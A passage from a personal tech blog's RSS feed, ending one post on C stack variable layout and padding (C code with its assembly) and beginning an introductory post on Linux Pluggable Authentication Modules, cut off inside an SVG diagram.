</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">e</span> <span class="o">=</span> <span class="mi">131</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">c</span> <span class="o">=</span> <span class="mi">129</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">d</span> <span class="o">=</span> <span class="mi">130</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">main:</span>
</span></span><span class="line"><span class="cl">        <span class="nf">push</span>    <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">rbp</span><span class="p">,</span> <span class="no">rsp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">BYTE</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-1</span><span class="p">],</span> <span class="mi">127</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">BYTE</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-2</span><span class="p">],</span> <span class="p">-</span><span class="mi">128</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">BYTE</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-3</span><span class="p">],</span> <span class="mi">111</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">BYTE</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-4</span><span class="p">],</span> <span class="mi">112</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-8</span><span class="p">],</span> <span class="mi">131</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">BYTE</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-9</span><span class="p">],</span> <span class="p">-</span><span class="mi">127</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">BYTE</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-10</span><span class="p">],</span> <span class="p">-</span><span class="mi">126</span>
</span></span><span class="line"><span class="cl">        <span class="nf">nop</span>
</span></span><span class="line"><span class="cl">        <span class="nf">pop</span>     <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">ret</span>
</span></span></code></pre></div><p>No change in the layout&hellip; variable <code>x</code> and <code>y</code> will fill up the 2 Bytes space that were just lying there to be used.</p>
<p>But if we add 1 more variable <code>z</code>, then the whole thing moves.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">main</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">a</span> <span class="o">=</span> <span class="mi">127</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">b</span> <span class="o">=</span> <span class="mi">128</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">x</span> <span class="o">=</span> <span class="mi">111</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">y</span> <span class="o">=</span> <span class="mi">112</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">Z</span> <span class="o">=</span> <span class="mi">123</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">e</span> <span class="o">=</span> <span class="mi">131</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">c</span> <span class="o">=</span> <span class="mi">129</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">d</span> <span class="o">=</span> <span class="mi">130</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">main:</span>
</span></span><span class="line"><span class="cl">        <span class="nf">push</span>    <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">rbp</span><span class="p">,</span> <span class="no">rsp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">BYTE</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-1</span><span class="p">],</span> <span class="mi">127</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">BYTE</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-2</span><span class="p">],</span> <span class="p">-</span><span class="mi">128</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">BYTE</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-3</span><span class="p">],</span> <span class="mi">111</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">BYTE</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-4</span><span class="p">],</span> <span class="mi">112</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">BYTE</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-5</span><span class="p">],</span> <span class="mi">123</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-12</span><span class="p">],</span> <span class="mi">131</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">BYTE</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-13</span><span class="p">],</span> <span class="p">-</span><span class="mi">127</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">BYTE</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-14</span><span class="p">],</span> <span class="p">-</span><span class="mi">126</span>
</span></span><span class="line"><span class="cl">        <span class="nf">nop</span>
</span></span><span class="line"><span class="cl">        <span class="nf">pop</span>     <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">ret</span>
</span></span></code></pre></div><p>If you are still visualizing the way I displayed above, now we have 3 bytes space in the row 2. This space is added by the compiler and is termed as <strong>padding</strong>. We can not always avoid padding, but a good programmer can arrange the variables in a way to minimize this.</p>
<p>That was a long detour, but definetily worth it. I&rsquo;ll cover more examples in later parts of this series. Till then, ciao!!</p>
<p><img loading="lazy" src="https://media.giphy.com/media/ie6l26rkxYA885tLqo/giphy.gif#center" alt=""  />
</p>
<div class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1">
<p><a href="https://en.wikipedia.org/wiki/Disassembler#Examples_of_disassemblers">https://en.wikipedia.org/wiki/Disassembler#Examples_of_disassemblers</a>&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:2">
<p><a href="https://developer.ibm.com/articles/pa-dalign/">https://developer.ibm.com/articles/pa-dalign/</a>&#160;<a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
</ol>
</div>
]]></content:encoded>
    </item>
    <item>
      <title>Pluggable Authentication Modules - Linux</title>
      <link>https://ayedaemon.github.io/post/2022/12/pluggable-authentication-modules-linux/</link>
      <pubDate>Tue, 27 Dec 2022 23:25:23 +0530</pubDate>
      <guid>https://ayedaemon.github.io/post/2022/12/pluggable-authentication-modules-linux/</guid>
      <description>Linux-PAM is a system of libraries that handle the authentication tasks of applications (services) on the system.</description>
      <content:encoded><![CDATA[<h2 id="pam---what-and-why">PAM - What and Why</h2>
<p>Authenticating a user to a service used to be a time-consuming process. The application had to be aware of all possible authentication mechanisms and had to be rebuilt every time a new authentication method was introduced&hellip; As a result, there was a significant amount of code repetition. Naturally, it was disliked by everyone!!</p>
<p>As a result, the concept of a middle-ware application responsible for user authentication to a service arose. And, Pluggable Authentication Modules (PAM), a collection of modules that act as a barrier between a service on your system and the service&rsquo;s user, were created.</p>
<p>Modules can include a variety of functions, such as disabling login for specific users/groups, limiting resources, audting, and so on. PAM is now supported by the vast majority of major unix flavours, including AIX, HP-US, FreeBSD, and nearly all Linux distributions.</p>
<p>The big advantage here is that security is no longer a concern for the application: if PAM says &ldquo;it&rsquo;s OK&rdquo;, it&rsquo;s OK. That simplifies things for both the application developer and the system administrator.</p>
<h2 id="understanding-pam">Understanding PAM</h2>
<p>According to <code>man (8) pam</code>,</p>
<blockquote>
<p>Linux-PAM is a system of libraries that handle the authentication tasks of applications (services) on the system. The library provides a stable general interface (Application Programming Interface - API) that privilege granting programs (such as login(1) and su(1)) defer to to perform standard authentication tasks.</p>
</blockquote>
<p>These libraries are typically configurable via defined arguments or dedicated configuration files. Internal behavior of the Linux-pam library is trivial from the standpoint of a sysadmin. The key point is to define the relationship between applications and the PAM.</p>
<p>The below diagram gives an idea of how PAM works.</p>



<div class="goat svg-container ">
  
    <svg
      xmlns="http://www.w3.org/2000/svg"
      font-family="Menlo,Lucida Console,monospace"
      
        viewBox="0 0 760 553"
      >
      <g transform='translate(8,16)'>
<text text-anchor='middle' x='104' y='260' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='104' y='276' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='104' y='292' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='104' y='308' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='104' y='324' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='104' y='340' fill='currentColor' style='font-size:1em'>├</text>
<text text-anchor='middle' x='104' y='356' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='104' y='372' fill='currentColor' style='font-size:1em'>└</text>
<text text-anchor='middle' x='112' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='112' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='112' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='112' y='452' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='112' y='468' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='112' y='484' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='112' y='500' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='112' y='516' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='112' y='532' fill='currentColor' style='font-size:1em'>└</text>
<text text-anchor='middle' x='120' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='120' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='120' y='356' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='120' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='120' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='120' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='128' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='128' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='128' y='356' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='128' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='128' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='128' y='484' fill='currentColor' style='font-size:1em'>/</text>
<text text-anchor='middle' x='128' y='516' fill='currentColor' style='font-size:1em'>/</text>
<text text-anchor='middle' x='128' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='136' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='136' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='136' y='356' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='136' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='136' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='136' y='484' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='136' y='516' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='136' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='144' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='144' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='144' y='356' fill='currentColor' style='font-size:1em'>_</text>
<text text-anchor='middle' x='144' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='144' y='388' fill='currentColor' style='font-size:1em'>	</text>
<text text-anchor='middle' x='144' y='404' fill='currentColor' style='font-size:1em'>	</text>
<text text-anchor='middle' x='144' y='420' fill='currentColor' style='font-size:1em'>	</text>
<text text-anchor='middle' x='144' y='436' fill='currentColor' style='font-size:1em'>	</text>
<text text-anchor='middle' x='144' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='144' y='484' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='144' y='516' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='144' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='152' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='152' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='152' y='356' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='152' y='372' fill='currentColor' style='font-size:1em'>┬</text>
<text text-anchor='middle' x='152' y='388' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='152' y='404' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='152' y='420' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='152' y='436' fill='currentColor' style='font-size:1em'>▼</text>
<text text-anchor='middle' x='152' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='152' y='484' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='152' y='516' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='152' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='68' fill='currentColor' style='font-size:1em'>	</text>
<text text-anchor='middle' x='160' y='84' fill='currentColor' style='font-size:1em'>	</text>
<text text-anchor='middle' x='160' y='100' fill='currentColor' style='font-size:1em'>	</text>
<text text-anchor='middle' x='160' y='116' fill='currentColor' style='font-size:1em'>	</text>
<text text-anchor='middle' x='160' y='132' fill='currentColor' style='font-size:1em'>	</text>
<text text-anchor='middle' x='160' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='356' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='160' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='484' fill='currentColor' style='font-size:1em'>/</text>
<text text-anchor='middle' x='160' y='516' fill='currentColor' style='font-size:1em'>/</text>
<text text-anchor='middle' x='160' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='168' y='68' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='168' y='84' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='168' y='100' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='168' y='116' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='168' y='132' fill='currentColor' style='font-size:1em'>└</text>
<text text-anchor='middle' x='168' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='168' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='168' y='356' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='168' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='168' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='168' y='484' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='168' y='516' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='168' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='148' fill='currentColor' style='font-size:1em'>	</text>
<text text-anchor='middle' x='176' y='164' fill='currentColor' style='font-size:1em'>	</text>
<text text-anchor='middle' x='176' y='180' fill='currentColor' style='font-size:1em'>	</text>
<text text-anchor='middle' x='176' y='196' fill='currentColor' style='font-size:1em'>	</text>
<text text-anchor='middle' x='176' y='212' fill='currentColor' style='font-size:1em'>	</text>
<text text-anchor='middle' x='176' y='228' fill='currentColor' style='font-size:1em'>	</text>
<text text-anchor='middle' x='176' y='244' fill='currentColor' style='font-size:1em'>	</text>
<text text-anchor='middle' x='176' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='356' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='176' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='484' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='176' y='516' fill='currentColor' style='font-size:1em'>h</text>
<text text-anchor='middle' x='176' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='132' fill='currentColor' style='font-size:1em'>┬</text>
<text text-anchor='middle' x='184' y='148' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='184' y='164' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='184' y='180' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='184' y='196' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='184' y='212' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='184' y='228' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='184' y='244' fill='currentColor' style='font-size:1em'>▼</text>
<text text-anchor='middle' x='184' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='356' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='184' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='484' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='184' y='516' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='184' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='356' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='192' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='484' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='192' y='516' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='192' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='100' fill='currentColor' style='font-size:1em'>A</text>
<text text-anchor='middle' x='200' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='356' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='200' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='484' fill='currentColor' style='font-size:1em'>w</text>
<text text-anchor='middle' x='200' y='516' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='200' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='100' fill='currentColor' style='font-size:1em'>P</text>
<text text-anchor='middle' x='208' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='484' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='208' y='516' fill='currentColor' style='font-size:1em'>w</text>
<text text-anchor='middle' x='208' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='216' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='216' y='100' fill='currentColor' style='font-size:1em'>P</text>
<text text-anchor='middle' x='216' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='216' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='216' y='340' fill='currentColor' style='font-size:1em'>┬</text>
<text text-anchor='middle' x='216' y='356' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='216' y='372' fill='currentColor' style='font-size:1em'>┴</text>
<text text-anchor='middle' x='216' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='216' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='224' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='224' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='224' y='148' fill='currentColor' style='font-size:1em'>▲</text>
<text text-anchor='middle' x='224' y='164' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='180' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='196' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='212' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='228' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='244' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='260' fill='currentColor' style='font-size:1em'>┴</text>
<text text-anchor='middle' x='224' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='224' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='224' y='452' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='224' y='468' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='484' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='500' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='516' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='532' fill='currentColor' style='font-size:1em'>┘</text>
<text text-anchor='middle' x='232' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='232' y='100' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='232' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='232' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='232' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='232' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='240' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='240' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='240' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='240' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='240' y='356' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='240' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='248' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='248' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='248' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='248' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='248' y='356' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='248' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='248' y='452' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='248' y='468' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='248' y='484' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='248' y='500' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='248' y='516' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='248' y='532' fill='currentColor' style='font-size:1em'>└</text>
<text text-anchor='middle' x='256' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='256' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='256' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='256' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='256' y='356' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='256' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='256' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='256' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='264' y='68' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='264' y='84' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='264' y='100' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='264' y='116' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='264' y='132' fill='currentColor' style='font-size:1em'>┘</text>
<text text-anchor='middle' x='264' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='264' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='264' y='356' fill='currentColor' style='font-size:1em'>_</text>
<text text-anchor='middle' x='264' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='264' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='264' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='272' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='272' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='272' y='356' fill='currentColor' style='font-size:1em'>l</text>
<text text-anchor='middle' x='272' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='272' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='272' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='280' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='280' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='280' y='356' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='280' y='372' fill='currentColor' style='font-size:1em'>┬</text>
<text text-anchor='middle' x='280' y='388' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='280' y='404' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='280' y='420' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='280' y='436' fill='currentColor' style='font-size:1em'>▼</text>
<text text-anchor='middle' x='280' y='452' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='280' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='288' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='288' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='288' y='356' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='288' y='372' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='288' y='452' fill='currentColor' style='font-size:1em'>─</text>
